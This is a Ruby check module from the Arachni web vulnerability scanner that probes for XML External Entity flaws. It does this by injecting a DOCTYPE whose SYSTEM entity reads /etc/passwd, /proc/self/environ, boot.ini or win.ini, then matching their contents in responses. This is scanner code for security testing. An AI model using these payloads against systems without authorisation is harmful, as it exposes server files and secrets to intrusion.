=begin
    Copyright 2010-2015 Tasos Laskos <tasos.laskos@arachni-scanner.com>

    This file is part of the Arachni Framework project and is subject to
    redistribution and commercial restrictions. Please see the Arachni Framework
    web site for more information on licensing and terms of use.
=end

# @author Tasos "Zapotek" Laskos <tasos.laskos@arachni-scanner.com>
# @version 0.1
class Arachni::Checks::Xxe < Arachni::Check::Base

    ENTITY = 'xxe_entity'

    def self.options
        @options ||= {
            format: [Format::STRAIGHT],
            regexp: {
                unix: [
                    /DOCUMENT_ROOT.*HTTP_USER_AGENT/,
                    /(root|mail):.+:\d+:\d+:.+:[0-9a-zA-Z\/]+/im
                ],
                windows: [
                    /\[boot loader\].*\[operating systems\]/im,
                    /\[fonts\].*\[extensions\]/im
                ]
            },

            each_mutation: proc do |mutation|
                mutation.platforms.pick( payloads ).map do |platform, payloads|
                    payloads.map do |payload|
                        m = mutation.dup

                        m.transform_xml do |xml|
                            xml.sub( m.affected_input_value, "&#{ENTITY};" )
                        end

                        m.audit_options[:platform] = platform
                        m.source = "<!DOCTYPE #{ENTITY} [ <!ENTITY #{ENTITY} SYSTEM \"#{payload}\"> ]>\n#{m.source}"
                        m
                    end
                end
            end
        }
    end

    def self.payloads
        @payloads ||= {
            unix:    [
                '/proc/self/environ',
                '/etc/passwd'
            ],
            windows: [
                '%SYSTEMDRIVE%\boot.ini',
                '%WINDIR%\win.ini'
            ]
        }
    end

    def run
        # We can't inject entities because they're going to get sanitized,
        # instead we inject a placeholder which we can later replace via a
        # regular text substitution.
        audit random_seed, self.class.options
    end

    def self.info
        {
            name:        'XML External Entity',
            description: %q{},
            elements:    [Element::XML],
            author:      'Tasos "Zapotek" Laskos <tasos.laskos@arachni-scanner.com>',
            version:     '0.1',
            platforms:   options[:regexp].keys,

            issue:       {
                name:            %q{XML External Entity},
                description:     %q{},
                references:      {},
                tags:            %w(),
                cwe:             611,
                severity:        Severity::HIGH,
                remedy_guidance: %q{}
            }
        }
    end

end
